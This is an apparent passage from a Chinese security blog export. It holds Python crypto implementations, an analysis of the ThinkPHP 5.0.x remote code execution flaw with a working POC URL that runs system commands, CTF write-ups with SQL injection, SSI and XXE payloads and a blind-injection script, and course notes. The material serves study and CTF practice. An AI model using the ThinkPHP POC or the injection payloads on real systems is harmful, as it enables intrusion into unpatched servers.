\"0E\"]] s = str2matrix(str) res = \"\" for i in range(0,len(s)): #i是行 j是列 for j in range(0,len(s[i])): tmp_ascii = 0x00 for n in range(0,len(s[i])): tmp_ascii = tmp_ascii^int(G(col[i][n],s[n][j]),16) tmp = hex(tmp_ascii)[2:] if len(tmp) != 2: for sb in range(0, 2 - len(tmp)): tmp = \"0\" + tmp res += tmp return res.upper()def ni_key_col_mix(str): col = [[\"0E\", \"0B\", \"0D\", \"09\"], [\"09\", \"0E\", \"0B\", \"0D\"], [\"0D\", \"09\", \"0E\", \"0B\"], [\"0B\", \"0D\", \"09\", \"0E\"]] s = str2matrix(str) res = [[\"0E\", \"0B\", \"0D\", \"09\"], [\"09\", \"0E\", \"0B\", \"0D\"], [\"0D\", \"09\", \"0E\", \"0B\"], [\"0B\", \"0D\", \"09\", \"0E\"]] for i in range(0,len(s)): #i是行 j是列 for j in range(0,len(s[i])): tmp_ascii = 0x00 for n in range(0,len(s[i])): tmp_ascii = tmp_ascii ^ int(G(col[i][n], s[n][j]), 16) tmp = hex(tmp_ascii)[2:] if len(tmp) != 2: for sb in range(0, 2 - len(tmp)): tmp = \"0\" + tmp res[i][j] = tmp.upper() return resdef ni_key_mix(str1,str2): my_str1 = ni_key_col_mix(str1) my_str2 = ni_key_col_mix(str2) res = \"\" for i in range(0,len(my_str1)): for j in range(0,len(my_str2)): tmp = hex(int(my_str1[i][j],16)^int(my_str2[i][j],16))[2:] if len(tmp) != 2: for j in range(0, 2 - len(tmp)): tmp = \"0\" + tmp res +=tmp return res.upper()def xor(str1,str2): x = '' for i in range(0,len(str1),2): tmp = hex(int(str1[i:i+2],16)^int(str2[i:i+2],16))[2:] if len(tmp)!=2 : tmp = '0' + tmp x += tmp return x.upper()def F(str): str = S_box(str) str = move(str) str = mix(str) return str# 密钥处理def R(str,i): Rcon = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1B,0x36] str = hex(int(str[0:2],16)^Rcon[i-1])[2:]+str[2:] return str.upper()def T(str,i): str = str[2:]+str[0:2] str = S_box(str) str = R(str,i) return str.upper()def key_10(str): key_final=[] key_final.append(str) for i in range(0,10): key = xor(str[i * 32:i * 32+ 8],T(str[i * 32+24:i * 32+32],i+1)) str += key for j in range(1,4): tmp = str[i * 32+j*8:i * 32+j*8 + 8] tmp1 = str[i * 32+j*8+24:i * 32+j*8 + 32] tmp = xor(tmp, tmp1) key += tmp str += tmp key_final.append(key.upper()) return key_final# 加密程序def encrypto(str,key): m = str2hex(str) key = str2hex(key) key = key_10(key) m = xor(m,key[0]) for i in range(1,10): m = F(m) m = xor(m,key[i]) m = S_box(m) m = move(m) m = xor(m,key[10]) return mdef decrypto(str,key):#16进制输入 key = str2hex(key) key = key_10(key) str = xor(str, key[10]) i = 9 while i&gt;0: str = _S_box(str) str = _move(str) str = ni_key_mix(str,key[i]) i = i - 1 str = _S_box(str) str = _move(str) str = xor(str, key[0]) return str.decode('hex')key='zydzydzydzydzydq'str='abcdefghjigklmno'print encrypto(str,key)print decrypto(encrypto(str,key),key) 序列密码RC41234567891011121314151617181920212223242526272829303132333435363738394041424344# coding:utf-8# author:altman# RC4def S_box(k): S = [] * 255 T = [] * 256 for i in range(0,256): S.append(i) T.append(ord(k[i % len(k)])) j = 0 for i in range(0,256): j = (j + S[i] + T[i]) % 256 tmp = S[i] S[i] = S[j] S[j] = tmp return Sdef RC4(m,k): c = '' i = j = 0 S = S_box(k) for n in range(len(m)): i = (i + 1) % 256 j = (j + S[i]) % 256 tmp = S[i] S[i] = S[j] S[j] = tmp t = (S[i] + S[j]) % 256 c += hex( (ord(m[n]) ^ S[t]) )[2:] return ckey = 'altman'message = 'justatest'c = RC4(message,key)print \"key: \"+keyprint \"密文: \"+cc='8684737f9e4ff9b1b8'c = RC4(c.decode('hex'),key).decode(\"hex\")print \"明文: \"+c hashmd5这个写起来也很麻烦，目前只实现了明文长度在一个分组内的加密，超过512bit的加密有点小问题，有时间再改吧。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130# coding:utf-8# author:altman# md5import mathA = '0x67452301'B = '0xefcdab89'C = '0x98badcfe'D = '0x10325476'def str2hex(str): res = '' for i in str: x = hex(ord(i))[2:] for i in range(0,2-len(x)): x = '0' + x res += x return res# 填充def appd(str): str = str2hex(str) lenth = len(str)*4 str += '80' while (len(str) * 4 + 64) % 512 != 0: str += '00' len_hex = (hex(lenth))[2:] if len(len_hex)%2!=0: len_hex ='0'+len_hex while (len(len_hex) * 4) != 64: len_hex += '00' str += len_hex return str# 移位def lift(str,n): res = (((str &lt;&lt; n) | (str &gt;&gt; (32 - n))) &amp; 0xffffffff) return res# 步函数def F(x,y,z): res = (x &amp; y) | ((~x) &amp; z) return resdef G(x,y,z): res = ( x &amp; z) | (y &amp; (~z)) return resdef H(x,y,z): return (x^y^z)def I(x,y,z): res = y ^ (x | (~z)) return resdef T(i): result = (int(4294967296 * abs(math.sin(i)))) &amp; 0xffffffff return hex(result)[2:]def re(str): res = '' for i in range(0,len(str),2): res += str[len(str)-i-2:len(str)-i] return resshi_1 = (7, 12, 17, 22) * 4shi_2 = (5, 9, 14, 20) * 4shi_3 = (4, 11, 16, 23) * 4shi_4 = (6, 10, 15, 21) * 4m_1 = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15)m_2 = (1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12)m_3 = (5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2)m_4 = (0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9)def FF(abcd,fun,m,shi): global t_count count =0 while count&lt;16: tmp = int(abcd[0],16) + fun(int(abcd[1], 16), int(abcd[2], 16), int(abcd[3], 16)) tmp += int(m[count],16) tmp += int(T(t_count),16) tmp = tmp &amp; 0xffffffff tmp2 = lift(tmp,shi[count]) abcd[0] = hex((int(abcd[1], 16) + tmp2) &amp; 0xffffffff) abcd = [abcd[3], abcd[0], abcd[1], abcd[2]] count +=1 t_count +=1 return abcddef M_16(m,str,t): count = 0 M = [0] * 16 for i in m: i=i*8 M[count] = re(str[i + t:i + t+2] + str[i + 2 + t:i + 4 + t] + str[i + 4 + t:i + 6 + t] + str[i + 6 + t:i + 8 + t]) count +=1 return Mt_count=1def md5(str): str = appd(str) abcd=[A,B,C,D] for i in range(0, len(str) / 128): M_1 = M_16(m_1, str, i) abcd = FF(abcd, F, M_1, shi_1) M_2 = M_16(m_2, str, i) abcd = FF(abcd, G, M_2, shi_2) M_3 = M_16(m_3, str, i) abcd = FF(abcd, H, M_3, shi_3) M_4 = M_16(m_4, str, i) abcd = FF(abcd, I, M_4, shi_4) final_a = re(hex(int(abcd[0], 16) + int(A, 16))[2:]) final_b = re(hex(int(abcd[1], 16) + int(B, 16))[2:]) final_c = re(hex(int(abcd[2], 16) + int(C, 16))[2:]) final_d = re(hex(int(abcd[3], 16) + int(D, 16))[2:]) abcd =[final_a,final_b,final_c,final_d] final= final_a+final_b+final_c+final_d return finalstr = 'a'print md5(str) 公钥密码RSA这个最简单了，随便找了对pq。 1234567891011121314151617181920212223242526272829303132333435363738# coding:utf-8# author:altman# RSAdef hex2str(str): res='' if len(str)%2 != 0: str = str +'0' for i in range(0,len(str),2): res += chr(int(str[i:i+2],16)) return res# 求模反def egcd(a,b): if b==0: return a,1,0 else: g,x,y=egcd(b,a%b) return g,y,x-a//b*ydef encrypto(str,n,e): str = int(str.encode(\"hex\"),16) c = pow(str,e,n) return cdef decrypto(c,n,d): m = pow(c,d,n) m = hex2str(hex(m)[2:].replace(\"L\",\"\")) return mp=275127860351348928173285174381581152299q=319576316814478949870590164193048041239n=p*qe=65537d=egcd(e,(p-1)*(q-1))[1]print encrypto('altman',n,e)print decrypto(encrypto('altman',n,e),n,d) //以后再补充修改","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://altman.vip/tags/crypto/"}]},{"title":"ThinkPhp5.0x_Getshell_分析","slug":"ThinkPhp5-0x-Getshell-分析","date":"2018-12-18T03:14:33.000Z","updated":"2018-12-19T07:42:13.476Z","comments":true,"path":"2018/12/18/ThinkPhp5-0x-Getshell-分析/","link":"","permalink":"http://altman.vip/2018/12/18/ThinkPhp5-0x-Getshell-分析/","excerpt":"前言分析一下前几天很火的tp5任意代码执行漏洞。 可以先看下官方公告。 测试版本为ThinkPHP V5.0.22，测试环境为OSX+apache2+php5.6+Mysql5.7。","text":"前言分析一下前几天很火的tp5任意代码执行漏洞。 可以先看下官方公告。 测试版本为ThinkPHP V5.0.22，测试环境为OSX+apache2+php5.6+Mysql5.7。 漏洞分析更新信息已修复的版本5.0.23在/library/think/App.php中555-556行中增加了对$controller的过滤。 123if (!preg_match('/^[A-Za-z](\\w|\\.)*$/', $controller)) &#123; throw new HttpException(404, 'controller not exists:' . $controller); &#125; POC : 1/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls 显然问题是出在控制器过滤不严格导致调用了不安全的控制器。 分析过程首先进入框架入口 1require __DIR__ . '/../thinkphp/start.php'; 引入了start.php。定位到这个文件 12// 2. 执行应用App::run()-&gt;send(); 利用run()函数执行应用。全局搜索定位到App.php:77。 在112-120行中查找到有关路由的操作。 123456789$dispatch = self::$dispatch;// 未设置调度信息则进行 URL 路由检测if (empty($dispatch)) &#123; $dispatch = self::routeCheck($request, $config);&#125;// 记录当前调度信息$request-&gt;dispatch($dispatch); 跟进定位到routeCheck()函数，同样在App.php：617 继续跟进这个path()函数 继续跟pathinfo()。 1234567891011121314151617181920212223242526public function pathinfo() &#123; if (is_null($this-&gt;pathinfo)) &#123; if (isset($_GET[Config::get('var_pathinfo')])) &#123; // 判断URL里面是否有兼容模式参数 $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')]; unset($_GET[Config::get('var_pathinfo')]); &#125; elseif (IS_CLI) &#123; // CLI模式下 index.php module/controller/action/params/... $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : ''; &#125; // 分析PATHINFO信息 if (!isset($_SERVER['PATH_INFO'])) &#123; foreach (Config::get('pathinfo_fetch') as $type) &#123; if (!empty($_SERVER[$type])) &#123; $_SERVER['PATH_INFO'] = (0 === strpos($_SERVER[$type], $_SERVER['SCRIPT_NAME'])) ? substr($_SERVER[$type], strlen($_SERVER['SCRIPT_NAME'])) : $_SERVER[$type]; break; &#125; &#125; &#125; $this-&gt;pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/'); &#125; return $this-&gt;pathinfo; &#125; 终于看到具体的获取方法。以GET方法获取path，然后层层传递到达routeCheck-&gt;$request。 ‘var_pathinfo’的值为s。 我们再回到routeCheck()分析 123// 路由检测（根据路由定义返回不同的URL调度） $result = Route::check($request, $path, $depr, $config['url_domain_deploy']); $must = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must']; path()传入后会经过路由检测，导入配置，最后返回调度给$result。 定位到Route::check() 对path进行一些检查替换。 返回来继续分析。 如果调度失败并且开启了强制路由$must，就抛出异常。 我们跟进他的异常处理 123if (false === $result) &#123; $result = Route::parseUrl($path, $depr, $config['controller_auto_search']); &#125; 他会调用parseUrl函数对path进行解析。跟进parseUrl。只看一些关键部分。 12345678910public static function parseUrl($url, $depr = '/', $autoSearch = false) &#123; if (isset(self::$bind['module'])) &#123; $bind = str_replace('/', $depr, self::$bind['module']); // 如果有模块/控制器绑定 $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr); &#125; $url = str_replace($depr, '|', $url); list($path, $var) = self::parseUrlPath($url); 对$url进行了parseUrlPath操作，我们继续跟进parseUrlPath()。 12345678910111213141516171819private static function parseUrlPath($url)&#123; // 分隔符替换 确保路由定义使用统一的分隔符 $url = str_replace('|', '/', $url); $url = trim($url, '/'); $var = []; if (false !== strpos($url, '?')) &#123; // [模块/控制器/操作?]参数1=值1&amp;参数2=值2... $info = parse_url($url); $path = explode('/', $info['path']); parse_str($info['query'], $var); &#125; elseif (strpos($url, '/')) &#123; // [模块/控制器/操作] $path = explode('/', $url); &#125; else &#123; $path = [$url]; &#125; return [$path, $var];&#125; 可以看到parseUrlPath将(module/controller/action)打散装进数组中。将结果返回parseUrl()中。parseUrl()将获得的(module/controller/action)封装进$route返回。 1$route = [$module, $controller, $action]; 然后我们重新回到run()函数中，$dispatch已经获得了数据，继续向下分析。进入App.php：139行。 $dispatch 进入到self::exec()中，继续跟进。 123456789101112131415161718192021222324252627282930313233343536373839protected static function exec($dispatch, $config) &#123; switch ($dispatch['type']) &#123; case 'redirect': // 重定向跳转 $data = Response::create($dispatch['url'], 'redirect') -&gt;code($dispatch['status']); break; case 'module': // 模块/控制器/操作 $data = self::module( $dispatch['module'], $config, isset($dispatch['convert']) ? $dispatch['convert'] : null ); break; case 'controller': // 执行控制器操作 $vars = array_merge(Request::instance()-&gt;param(), $dispatch['var']); $data = Loader::action( $dispatch['controller'], $vars, $config['url_controller_layer'], $config['controller_suffix'] ); break; case 'method': // 回调方法 $vars = array_merge(Request::instance()-&gt;param(), $dispatch['var']); $data = self::invokeMethod($dispatch['method'], $vars); break; case 'function': // 闭包 $data = self::invokeFunction($dispatch['function']); break; case 'response': // Response 实例 $data = $dispatch['response']; break; default: throw new \\InvalidArgumentException('dispatch type not support'); &#125; return $data; &#125; 由于parseUrl()函数最后的赋值，显然我们会进入module分支。然后进入model()函数，跟进model()函数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114public static function module($result, $config, $convert = null)&#123; if (is_string($result)) &#123; $result = explode('/', $result); &#125; $request = Request::instance(); if ($config['app_multi_module']) &#123; // 多模块部署 $module = strip_tags(strtolower($result[0] ?: $config['default_module'])); $bind = Route::getBind('module'); $available = false; if ($bind) &#123; // 绑定模块 list($bindModule) = explode('/', $bind); if (empty($result[0])) &#123; $module = $bindModule; $available = true; &#125; elseif ($module == $bindModule) &#123; $available = true; &#125; &#125; elseif (!in_array($module, $config['deny_module_list']) &amp;&amp; is_dir(APP_PATH . $module)) &#123; $available = true; &#125; // 模块初始化 if ($module &amp;&amp; $available) &#123; // 初始化模块 $request-&gt;module($module); $config = self::init($module); // 模块请求缓存检查 $request-&gt;cache( $config['request_cache'], $config['request_cache_expire'], $config['request_cache_except'] ); &#125; else &#123; throw new HttpException(404, 'module not exists:' . $module); &#125; &#125; else &#123; // 单一模块部署 $module = ''; $request-&gt;module($module); &#125; // 设置默认过滤机制 $request-&gt;filter($config['default_filter']); // 当前模块路径 App::$modulePath = APP_PATH . ($module ? $module . DS : ''); // 是否自动转换控制器和操作名 $convert = is_bool($convert) ? $convert : $config['url_convert']; // 获取控制器名 $controller = strip_tags($result[1] ?: $config['default_controller']); $controller = $convert ? strtolower($controller) : $controller; // 获取操作名 $actionName = strip_tags($result[2] ?: $config['default_action']); if (!empty($config['action_convert'])) &#123; $actionName = Loader::parseName($actionName, 1); &#125; else &#123; $actionName = $convert ? strtolower($actionName) : $actionName; &#125; // 设置当前请求的控制器、操作 $request-&gt;controller(Loader::parseName($controller, 1))-&gt;action($actionName); // 监听module_init Hook::listen('module_init', $request); try &#123; $instance = Loader::controller( $controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller'] ); &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // 获取当前操作名 $action = $actionName . $config['action_suffix']; $vars = []; if (is_callable([$instance, $action])) &#123; // 执行操作方法 $call = [$instance, $action]; // 严格获取当前操作方法名 $reflect = new \\ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config['action_suffix']; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // 空操作 $call = [$instance, '_empty']; $vars = [$actionName]; &#125; else &#123; // 操作不存在 throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; Hook::listen('action_begin', $call); return self::invokeMethod($call, $vars);&#125; 这个函数代码略长，大概分析一下。$request会进入多模块部署，然后进入else if分支进行模块是否存在的判断。 最后一波操作后会进入 1self::invokeMethod($call, $vars); 其中 $call存放的是 controller 继续跟进 invokeMethod() 12345678910111213141516public static function invokeMethod($method, $vars = []) &#123; if (is_array($method)) &#123; $class = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]); $reflect = new \\ReflectionMethod($class, $method[1]); &#125; else &#123; // 静态方法 $reflect = new \\ReflectionMethod($method); &#125; $args = self::bindParams($reflect, $vars); self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info'); return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args); &#125; 此时method是一个数组，[0]存放的是think/app,[1]存放的是invokefunction 通过ReflectionMethod调用mehtod也就是think/app模型下的方法。 同样，通过bindParams获取$var中的参数 也就是payload中的 1&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls 然后通过 1$reflect-&gt;invokeArgs(isset($class) ? $class : null, $args); 将方法和参数传入invokeFunction()中。 12345678910public static function invokeFunction($function, $vars = [])&#123; $reflect = new \\ReflectionFunction($function); $args = self::bindParams($reflect, $vars); // 记录执行信息 self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;__toString(), 'info'); return $reflect-&gt;invokeArgs($args);&#125; 执行call_user_func_array(‘system’,[‘ls’])。 攻击流程图 若有错误，还请各位大佬指正。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"ELS_2018_WriteUp","slug":"ELS-2018-WriteUp","date":"2018-11-16T14:47:56.000Z","updated":"2018-11-16T17:25:23.365Z","comments":true,"path":"2018/11/16/ELS-2018-WriteUp/","link":"","permalink":"http://altman.vip/2018/11/16/ELS-2018-WriteUp/","excerpt":"WEBSimpleBBS登录界面界面随手尝试输入单引号，引发了报错。 随即尝试报错注入","text":"WEBSimpleBBS登录界面界面随手尝试输入单引号，引发了报错。 随即尝试报错注入 11' and (extractvalue(1,concat(0x7e,database(),0x7e)))# 成功爆出数据库，下面就是常规注入了 11' and (extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e)))# 用substr函数截取，拿到完整flag。 11' and (extractvalue(1,concat(0x7e,(select substr(flag,20,40) from flag limit 0,1),0x7e)))# SimpleServerInjectionhint：SimpleServerInjection, SSI, flag in current directory SSI:服务器端包含攻击 https://www.secpulse.com/archives/66934.html 根据文章的payload ： 1&lt;!--#include virtual=\"flag\" --&gt; SimpleExtensionExplorerInjection提示XXE, /flag。 直接尝试XXE进行读文件 需要改 content-type:application/xml SimplePrintEventLoggerhint:same server as SimpleExtensionExploreInjection , RCE, flag in / 和上一题同样的环境，flag在根目录下。 还是用上题的payload 直接读到根目录，有个flagvvvvvaaaagegsgag2333文件 然后读flagvvvvvaaaagegsgag2333 (和RCE有什么关系？非预期了吗) SimpleBlog随便登录进去之后看到提示二次注入和文件包含。 经过一波尝试发现 注册一个 a’ 账户 ，无论怎么点题目都是0分。 但是注册一个 a’ # ，点题会有分数出现。可以构造bool盲注 。 11' and if(1,exp(999999999999),1)# 执行exp()函数会造成报错，会造成分数都为0。 11' and if(0,exp(999999999999),1)# 如果语句正常执行不报错，分数会正常显示。 这样就构成了bool盲注。 编写脚本 12345678910111213141516171819202122232425262728293031323334353637383940# encoding=utf-8import requestsdef reg(name): url=\"http://210.32.4.20/register.php\" data=&#123; 'username': name , 'password': '123456' &#125; r=requests.post(url=url,data=data) return r.headers['Set-Cookie'][10:-8]def log(name,cookie): cookies = &#123; 'PHPSESSID': cookie &#125; url='http://210.32.4.20/login.php' data = &#123; 'username': name, 'password': '123456' &#125; requests.post(url=url, data=data, cookies=cookies) url = 'http://210.32.4.20/answer.php' data = &#123; '1.a': 'on' &#125; r = requests.post(url=url, data=data, cookies=cookies) if 'Your grades is 0' in r.content: return 1 else: return 0flag=''for i in range(1,1000): for j in (33,127): payload = '''1' and if((ascii(substr((select flag from flag limit 0,1),%d,1))=%d),exp(999999999999),1)#'''%(i, j) session = reg(payload) if (log(payload,session)): flag=flag+chr(j) print flag break 根据提示在flag表flag段中找到。 miscgogogo流量包追踪tcp流 保存照片得到flag。 checkin验证码识别题 由于数量大并且有时间显示，考虑跑脚本来进⾏自动识别。首先需要写⼀一个training.py，收集验证码供人识别，产⽣一个训练集： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import pwnlabels = dict()labeled = 0fails = 0while labeled &lt; 36: isFailed = True io = pwn.remote('210.32.4.14', 13373) io.recvline() io.recvline() io.recvline() lines = [] for i in range(10): cur = io.recvline() lines.append(cur) for no in range(6): cur = '' for i in range(10): for j in range(18 * no, 18 * (no + 1)): cur += lines[i][j] cur += '\\n' isLabeled = False for value in labels.itervalues(): if cur == value: isLabeled = True if isLabeled: break print cur ans = raw_input() labels[ans[0]] = cur labeled += 1 isFailed = False if isFailed: fails += 1 else: fails = 0 if fails &gt; 20: break print '%d pictures have been labeled. ' % labeled io.close()f = open('trainingset.txt', 'wt')for key, value in labels.iteritems(): f.write(key) f.write('=') f.write(value.encode('hex')) f.write('#\\n')f.close() 然后开始自动识别 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import pwnlabels = dict()f = open('trainingset.txt', 'rt')flines = f.readlines()for line in flines: c = line[0] label = line[2:-2].decode('hex') labels[c] = labelio = pwn.remote('210.32.4.14', 13373)io.recvline()io.recvline()io.recvline()for _ in range(20): lines = [] for i in range(10): cur = io.recvline() lines.append(cur) ans = '' for no in range(6): cur = '' for i in range(10): for j in range(18 * no, 18 * (no + 1)): cur += lines[i][j] cur += '\\n' isLabeled = False curChr = '' for key, value in labels.iteritems(): if cur == value: isLabeled = True curChr = key break if not isLabeled: print cur curChr = raw_input()[0] labels[curChr] = cur f = open('trainingset.txt', 'at') f.write(curChr) f.write('=') f.write(cur.encode('hex')) f.write('#\\n') ans += curChr io.recvuntil('your captcha: ') io.sendline(ans)print io.recvall()io.close() 拿到flag CRYPTOAzureRSA12345678910n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723Le1=0xfae3aLc1=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaLn2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63Le2=0x1f9eaeLc2=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347Lassert pow(flag,e1,n1)==c1assert pow(flag,e2,n2)==c2assert gcd(e1,(p1-1)*(q1-1))==14assert gcd(e2,(p2-1)*(q2-1))==14 解密脚本 123456789101112131415161718192021222324252627282930313233import gmpy2from libnum import *n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723Le1=0xfae3aLc1=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaLn2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63Le2=0x1f9eaeLc2=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347Lp=gcd(n1,n2)q1=n1/pq2=n2/passert(p*q1==n1)assert(p*q2==n2)f1=(p-1)*(q1-1)f2=(p-1)*(q2-1)tmp=gcd(e1,e2)e1=e1/tmpe2=e2/tmpd1=invmod(e1,f1)d2=invmod(e2,f2)m1=pow(c1,d1,n1)m2=pow(c2,d2,n2)m3=m1%pm2=m2%q2m1=m1%q1m=solve_crt([m1,m2,m3], [q1,q2,p])print mn=q1*q2f=(q1-1)*(q2-1)m=m%nd=invmod(7,f)m=pow(m,d,n)print n2s(gmpy2.iroot(m, 2)[0])","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"网络安全课程复习","slug":"网络安全课程复习","date":"2018-11-15T11:42:39.000Z","updated":"2018-11-26T05:36:25.949Z","comments":true,"path":"2018/11/15/网络安全课程复习/","link":"","permalink":"http://altman.vip/2018/11/15/网络安全课程复习/","excerpt":"快考试了，总结一下网络安全的知识点。","text":"快考试了，总结一下网络安全的知识点。 第一章 概论0x00 网络安全主要威胁特洛伊木马，黑客攻击，后门，计算机病毒，拒绝服务攻击，内外部泄密，蠕虫，逻辑炸弹，信息丢失篡改销毁。 0x01 网络安全的三个基本属性 C I A (扩展5个)机密性(Confidentiality) 完整性(Integrity) 可用性(Availabiliy) 可靠性(Dependability) 不可抵赖性(Undeniability) 可控性(Controllability) 可审查性(Auditability) 真实性(Authenticity) 0x02 计算机信息系统安全保护TCSEC（Trusted Computer Evaluation Criteria，可信 计算机系统评估准则，美国国防部标准（1983）；4类 7级 • D级 ：安全保护欠缺级 • C1级：自主安全保护级 • C2级：受控存取保护级 • B1级：标记安全保护级 • B2级：结构化保护级 • B3级：安全域保护级 • A级 ：验证设计级 0x03 网络安全体系机构 OSI 提供了哪些安全服务（5类）0.认证（鉴别）服务：在网络交互过程中，对收发双方的身份及数据来源进行验证。1.访问控制服务：防止未授权用户非法访问资源，包括用户身份认证和用户权限确认。2.数据保密性服务：防止数据在传输过程中被破解、泄露。3.数据完整性服务：防止数据在传输过程中被篡改。4.抗否认性服务：也称为抗抵赖服务或确认服务。防止发送方与接收方双方在执行各自操作后，否认各自所做的操作。 0x04 OSI提供了哪8种安全机制 (具体)0.加密机制：加密机制对应数据保密性服务。加密是提高数据安全性的最简便方法。通过对数据进行加密，有效提高了数据的保密性，能防止数据在传输过程中被窃取。常用的加密算法有对称加密算法（如DES算法）和非对称加密算法（如RSA算法）。 1.数字签名机制：数字签名机制对应认证（鉴别）服务。数字签名是有效的鉴别方法，利用数字签名技术可以实施用户身份认证和消息认证，它具有解决收发双方纠纷的能力，是认证（鉴别）服务最核心的技术。在数字签名技术的基础上，为了鉴别软件的有效性，又产生了代码签名技术。常用的签名算法有RSA算法和DSA算法等。 2.访问控制机制：访问控制机制对应访问控制服务。通过预先设定的规则对用户所访问的数据进行限制。通常，首先是通过用户的用户名和口令进行验证，其次是通过用户角色、用户组等规则进行验证，最后用户才能访问相应的限制资源。一般的应用常使用基于用户角色的访问控制方式，如RBAC（Role Basic Access Control，基于用户角色的访问控制）。 3.数据完整性机制：数据完整性机制对应数据完整性服务。数据完整性的作用是为了避免数据在传输过程中受到干扰，同时防止数据在传输过程中被篡改，以提高数据传输完整性。通常可以使用单向加密算法对数据加密，生成唯一验证码，用以校验数据完整性。常用的加密算法有MD5算法和SHA算法等。 4.认证机制：认证机制对应认证（鉴别）服务。认证的目的在于验证接收方所接收到的数据是否来源于所期望的发送方，通常可使用数字签名来进行认证。常用算法有RSA算法和DSA算法等。 5.业务流填充机制：也称为传输流填充机制。业务流填充机制对应数据保密性服务。业务流填充机制通过在数据传输过程中传送随机数的方式，混淆真实的数据，加大数据破解的难度，提高数据的保密性。 6.路由控制机制：路由控制机制对应访问控制服务。路由控制机制为数据发送方选择安全网络通信路径，避免发送方使用不安全路径发送数据，提高数据的安全性。 